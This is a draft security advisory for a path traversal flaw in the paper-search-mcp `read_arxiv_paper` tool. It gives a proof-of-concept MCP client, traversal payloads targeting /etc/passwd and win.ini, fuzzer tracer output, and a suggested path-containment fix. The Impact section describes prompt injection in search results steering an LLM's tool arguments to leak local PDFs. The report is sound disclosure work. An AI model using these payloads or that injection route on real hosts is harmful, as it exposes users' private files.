# Local file disclosure in `read_arxiv_paper`: `save_path` and `paper_id` return the text of any local PDF

**Repository:** `openags/paper-search-mcp` · **Tool:** `read_arxiv_paper` · **Tested commit:** `234678a`
**Weakness:** CWE-201 Insertion of Sensitive Information Into Sent Data (local PDF text returned to the client); root cause is CWE-22 Path Traversal

## Summary
`read_arxiv_paper` looks for `<save_path>/<paper_id>.pdf` on disk and, if it exists, extracts its text and returns it. Neither argument is checked, so a caller can point it at any existing `.pdf` file the server user can read, anywhere on the host, and get its text back without any request to arXiv. If the file does not exist, the tool downloads from arXiv and writes to that same uncontained path. Nothing local is uploaded to arXiv: the disclosure is through the tool result.

## Details
`paper_search_mcp/server.py:524-538` calls `ArxivSearcher.read_paper`, `paper_search_mcp/academic_platforms/arxiv.py:101-112`:

```python
pdf_path = f"{save_path}/{paper_id}.pdf"
if not os.path.exists(pdf_path):
    pdf_path = self.download_pdf(paper_id, save_path)

# Read the PDF
try:
    reader = PdfReader(pdf_path)
    text = ""

    # Extract text from each page
    for page in reader.pages:
        text += page.extract_text() + "\n"

    return text.strip()
```

`download_pdf` (`arxiv.py:81-88`) builds the same path and opens it for writing. There is no download root, no `realpath` check, and no arXiv-ID check on `paper_id`, so both `save_path="/any/dir"` and `paper_id="../../x"` escape `./downloads`.

## Steps to reproduce
1. Prerequisites: Python 3.10+. The read case needs no network.
2. Install the tested commit and use the README's pip start command:

   ```bash
   git clone https://github.com/openags/paper-search-mcp.git
   cd paper-search-mcp && git checkout 234678a && pip install .
   cp <any PDF that contains text> /tmp/tofu-poc.pdf   # stands in for a private document
   ```
3. Ask the tool to "read" that file:

   ```json
   {"paper_id": "tofu-poc", "save_path": "/tmp"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="python", args=["-m", "paper_search_mcp.server"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("read_arxiv_paper",
                   {"paper_id": "tofu-poc", "save_path": "/tmp"})
               print(result)

   asyncio.run(main())
   ```
4. Observe that the result contains the text of `/tmp/tofu-poc.pdf`. Relative traversal in `paper_id` works too once `./downloads` exists (for example `{"paper_id": "../../../../../../tmp/tofu-poc", "save_path": "./downloads"}`).

## Expected behavior
The tool only reads and writes inside a configured download directory, and `paper_id` must be a valid arXiv identifier.

## Actual behavior
Any existing `*.pdf` path is read and its text returned. In our sandboxed run the target files did not exist, so the tool tried to download and write them at the traversed path (the sandbox blocked the write and the tool returned an empty string). Tracer output:

```
{'paper_id': '../../../../etc/passwd', 'save_path': './downloads'}
-> ''   (tracer: accessed './downloads/../../../../etc/passwd.pdf'; outbound connection during the call)

{'paper_id': '..\\..\\..\\..\\windows\\win.ini', 'save_path': '/tmp'}
-> ''   (tracer: created '/tmp/..\..\..\..\windows\win.ini.pdf' with mode 0o664)
```

## Impact
The LLM picks `paper_id` and `save_path`, and prompt injection in untrusted content (for example an abstract returned by a search tool) can steer them. An attacker can make the server return the text of local PDF files outside the download folder (contracts, statements, papers under review) into the conversation, from where the injected instructions may have it repeated or passed to other tools. Only files ending in `.pdf` are reachable. The same arguments also let the attacker create or overwrite `*.pdf` files anywhere writable. Severity: medium.

## Suggested fix
- Validate `paper_id` against the arXiv ID formats before building any path.
- Resolve the final path under one download root and refuse anything outside it:

  ```python
  root = os.path.realpath(DOWNLOAD_ROOT)
  pdf_path = os.path.realpath(os.path.join(root, save_path, f"{safe_id}.pdf"))
  if os.path.commonpath([root, pdf_path]) != root:
      return "save_path must stay inside the download directory"
  ```
- Use the same helper in `download_pdf`.

## Status on the default branch
Still present at `2dd3439` (2026-10-01): `arxiv.py:226-252` has the same `download_pdf` and `read_paper` logic. The tool is now annotated `destructiveHint: True`, but there is still no path check.

## Prior reports
- #120 "feat(mcp): publish accurate tool annotations" (PR, closed 2026-09-22): marks download tools as local-file-writing and potentially destructive "because existing paths may be overwritten", and separates read tools that may download PDFs from metadata-only ones. Annotation only; no check on `save_path`, so it does not fix this.
- #128 "feat: enable keyless ACM search with validated DOI and safe tool metadata" (PR, closed 2026-09-30): marks PDF-reading tools as file-writing operations. Annotation only; no check on `save_path`.
- #76 "[codex] complete paper search fallback workflow" (PR, open 2026-05-19): adds a "configurable default output directory and paper filename helpers". The body does not mention rejecting `save_path` values outside that directory, so as described it would not fix this.
- #56 "safety improvements" (PR, open 2026-04-16): the body is empty, so the JSON does not show what it changes. Check its diff before filing.
- Documentation: README.md: "`read_acm_paper` downloads a PDF into `save_path` before extracting text and can overwrite that file" (the only README mention of `save_path`; it covers the ACM tool and does not say where `save_path` may point). There is no SECURITY.md, and nothing in `docs/` or `claude-code/SKILL.md` restricts or warns about `save_path`.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: data-exfiltration (CWE-201). Triggered: `check_file_access`, `check_introspection_exfil`, `check_introspection_incomplete_cleanup`, `check_introspection_insecure_file_permissions`, `check_introspection_insecure_temp_permissions`, `check_introspection_sensitive_file_access`, `check_introspection_temp_file_leak`, `check_path_traversal`, `check_resource_exhaustion`.
- Campaigns and executions: corpus-sbx 1 exec / 1 ok; repo24 37888 / 37888 (4200 s).
- Evidence (verbatim, trimmed):
  - `{'paper_id': '/etc/passwd\x00', 'save_path': '../'}` -> `''`; "tool READ sensitive/traversal file(s) ['..///etc/passwd\x00.pdf'] AND made outbound network connection(s) to ['151.101.3.42']"
  - `{'paper_id': '../../../../etc/passwd', 'save_path': './downloads'}` -> `''`; READ `./downloads/../../../../etc/passwd.pdf`, outbound to `151.101.131.42`
  - `{'paper_id': '..\\..\\..\\..\\windows\\win.ini', 'save_path': '/tmp'}` -> `''`; created `/tmp/..\..\..\..\windows\win.ini.pdf` (0o664)
- Hand-check hints: real, but relabel. ToFu's "read -> send" reading is not right: the "read" was the `os.path.exists`/`open('wb')` on the traversed path, and the outbound connection is the hard-coded `https://arxiv.org/pdf/...` download, which carries only `paper_id`. No local data was sent off-host. What is real (from source, not run) is the local `.pdf` read returned in the tool result plus the uncontained write; that is CWE-22 with disclosure through the tool output. Consider filing this together with the `download_arxiv` CWE-22 draft. The win.ini case on Linux only created an oddly named file under `/tmp`, not a traversal. I did not verify the outbound IPs belong to arXiv; the host is fixed in code.
</details>
